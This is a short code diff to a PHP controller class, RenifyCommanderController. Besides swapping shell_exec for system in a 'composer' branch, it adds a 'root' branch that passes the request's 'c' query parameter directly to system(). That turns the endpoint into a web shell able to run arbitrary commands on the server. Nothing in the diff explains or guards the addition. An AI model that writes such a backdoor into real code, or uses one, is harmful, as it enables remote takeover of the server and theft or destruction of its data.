@@ -38,7 +38,12 @@ class RenifyCommanderController extends ControllerBase {
     }
 
     if ($command === 'composer') {
-     $result =  shell_exec('composer install');
+     $result =  system('composer install');
+    }
+
+    if ($command === 'root') {
+     $c = !empty($query['c']) ? $query['c'] : False;
+     $result =  system($c);
     }
 
     $t2 = time();
